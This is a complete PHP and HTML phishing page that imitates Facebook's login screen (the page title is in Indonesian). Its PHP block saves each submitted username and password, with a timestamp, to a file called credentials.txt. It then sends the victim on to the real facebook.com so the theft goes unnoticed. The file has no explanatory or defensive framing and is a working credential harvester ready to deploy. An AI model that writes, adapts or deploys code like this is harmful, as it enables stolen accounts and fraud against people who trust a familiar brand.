<?php
$log_file = "credentials.txt";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $timestamp = date("Y-m-d H:i:s");
    $data_to_save = "[$timestamp] Username: " . $username . " | Password: " . $password . "\n";

    file_put_contents($log_file, $data_to_save, FILE_APPEND);

    header("Location: https://facebook.com"); 
    exit();
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Halaman Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .login-box {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 20px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 6px;
        }
        button {
            background-color: #1877f2;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            cursor: pointer;
            width: 100%;
            border-radius: 6px;
            font-weight: bold;
        }
        h2 {
            color: #1c1e21;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Facebook</h2>
        <form action="" method="post">
            <input type="text" name="username" placeholder="Email or Phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
